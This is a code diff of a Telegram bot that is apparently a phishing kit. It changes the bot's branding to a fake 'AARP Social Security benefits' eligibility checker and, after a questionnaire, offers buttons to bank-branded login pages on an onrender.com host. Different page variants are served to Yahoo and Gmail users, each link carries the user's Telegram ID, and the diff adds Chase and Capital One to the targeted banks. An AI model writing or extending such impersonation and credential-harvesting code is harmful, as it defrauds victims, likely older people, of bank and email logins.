@@ -104,8 +104,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Start the conversation and ask user for input."""
     user = update.message.from_user
     await   update.message.reply_text(
-        f"Hello {user.first_name}! Welcome to the Aries Financial assistance bot.\n"
-        "Do well to answer all questions so we can get to know you.\n"
+        f"Hello {user.first_name}! Welcome to AARP Social Security benefits bot.\n"
+        "Do well to answer a few questions so we can get to know if you're eligible for Social Security benefits right now.\n\n"
         "Please press CONTINUE to begin",
         reply_markup=markup2,
     )
@@ -125,7 +125,7 @@ async def ask_question(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
         await update.message.reply_text(questions[current_question])
     else:
         reply_markup = markup
-        await update.message.reply_text("You've answered all the questions. Click 'Done' to finish.", reply_markup=reply_markup)
+        await update.message.reply_text("You're almost there. Click 'Done' to move to the next part.", reply_markup=reply_markup)
         return DONE
     
     return QUESTIONS
@@ -190,40 +190,48 @@ async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     # Define each link, depending on the user's mail
     if re.search(yahoo_pattern, user_email):
-        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho_yahoo?tgUserId={user_id}'
-        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu_yahoo?tgUserId={user_id}'
-        MT_Bank = f'https://finance-79lm.onrender.com/M&T_yahoo?tgUserId={user_id}'
-        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica_yahoo?tgUserId={user_id}'
-        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank_yahoo?tgUserId={user_id}'
-        USAA = f'https://finance-79lm.onrender.com/USAA_yahoo?tgUserId={user_id}'
-        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo_yahoo?tgUserId={user_id}'
+        IDAHO_Bank = f'https://aarp.onrender.com/Idaho_yahoo?tgUserId={user_id}'
+        RBFCU_Bank = f'https://aarp.onrender.com/rbfcu_yahoo?tgUserId={user_id}'
+        MT_Bank = f'https://aarp.onrender.com/M&T_yahoo?tgUserId={user_id}'
+        BOA = f'https://aarp.onrender.com/BankOfAmerica_yahoo?tgUserId={user_id}'
+        CITI_BANK = f'https://aarp.onrender.com/CitiBank_yahoo?tgUserId={user_id}'
+        USAA = f'https://aarp.onrender.com/USAA_yahoo?tgUserId={user_id}'
+        WELLS = f'https://aarp.onrender.com/Welz-Fargo_yahoo?tgUserId={user_id}'
+        CHASE_Bank = f'https://aarp.onrender.com/chase_yahoo?tgUserId={user_id}'
+        CAPITALONE_Bank = f'https://aarp.onrender.com/CapitalOne_yahoo?tgUserId={user_id}'
 
     elif re.search(gmail_pattern, user_email):
-        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho_gmail?tgUserId={user_id}'
-        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu_gmail?tgUserId={user_id}'
-        MT_Bank = f'https://finance-79lm.onrender.com/M&T_gmail?tgUserId={user_id}'
-        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica_gmail?tgUserId={user_id}'
-        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank_gmail?tgUserId={user_id}'
-        USAA = f'https://finance-79lm.onrender.com/USAA_GMAIL?tgUserId={user_id}'
-        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo_gmail?tgUserId={user_id}'
+        IDAHO_Bank = f'https://aarp.onrender.com/Idaho_gmail?tgUserId={user_id}'
+        RBFCU_Bank = f'https://aarp.onrender.com/rbfcu_gmail?tgUserId={user_id}'
+        MT_Bank = f'https://aarp.onrender.com/M&T_gmail?tgUserId={user_id}'
+        BOA = f'https://aarp.onrender.com/BankOfAmerica_gmail?tgUserId={user_id}'
+        CITI_BANK = f'https://aarp.onrender.com/CitiBank_gmail?tgUserId={user_id}'
+        USAA = f'https://aarp.onrender.com/USAA_GMAIL?tgUserId={user_id}'
+        WELLS = f'https://aarp.onrender.com/Welz-Fargo_gmail?tgUserId={user_id}'
+        CHASE_Bank = f'https://aarp.onrender.com/chase_gmail?tgUserId={user_id}'
+        CAPITALONE_Bank = f'https://aarp.onrender.com/CapitalOne_gmail?tgUserId={user_id}'
     else:
-        IDAHO_Bank = f'https://finance-79lm.onrender.com/Idaho?tgUserId={user_id}'
-        RBFCU_Bank = f'https://finance-79lm.onrender.com/rbfcu?tgUserId={user_id}'
-        MT_Bank = f'https://finance-79lm.onrender.com/M&T?tgUserId={user_id}'
-        BOA = f'https://finance-79lm.onrender.com/BankOfAmerica?tgUserId={user_id}'
-        CITI_BANK = f'https://finance-79lm.onrender.com/CitiBank?tgUserId={user_id}'
-        USAA = f'https://finance-79lm.onrender.com/USAA?tgUserId={user_id}'
-        WELLS = f'https://finance-79lm.onrender.com/Welz-Fargo?tgUserId={user_id}'
+        IDAHO_Bank = f'https://aarp.onrender.com/IdahoAuth?tgUserId={user_id}'
+        RBFCU_Bank = f'https://aarp.onrender.com/rbfcuAuth?tgUserId={user_id}'
+        MT_Bank = f'https://aarp.onrender.com/M&TAuth?tgUserId={user_id}'
+        BOA = f'https://aarp.onrender.com/BankOfAmericaAuth?tgUserId={user_id}'
+        CITI_BANK = f'https://aarp.onrender.com/CitiBankAuth?tgUserId={user_id}'
+        USAA = f'https://aarp.onrender.com/USAAAuth?tgUserId={user_id}'
+        WELLS = f'https://aarp.onrender.com/Welz-FargoAuth?tgUserId={user_id}'
+        CHASE_Bank = f'https://aarp.onrender.com/chaseAuth?tgUserId={user_id}'
+        CAPITALONE_Bank = f'https://aarp.onrender.com/CapitalOneAuth?tgUserId={user_id}'
 
 
     
     """Sends a message with eight inline buttons attached."""
     keyboard = [
         [InlineKeyboardButton("IDAHO Bank", url=IDAHO_Bank)],
+        [InlineKeyboardButton("CHASE Bank", url=CHASE_Bank)],
         [InlineKeyboardButton("M&T bank", url=MT_Bank)],
         [InlineKeyboardButton("Bank of America", url=BOA)],
         [InlineKeyboardButton("CITI Bank", url=CITI_BANK)],
         [InlineKeyboardButton("Wells Fargo", url=WELLS)],
+        [InlineKeyboardButton("Capital One", url=CAPITALONE_Bank)],
         [InlineKeyboardButton("USAA", url=USAA)],
         [InlineKeyboardButton("Randolph-Brooks Federal Credit Union", url=RBFCU_Bank)],
         [InlineKeyboardButton("Others", callback_data="other")],
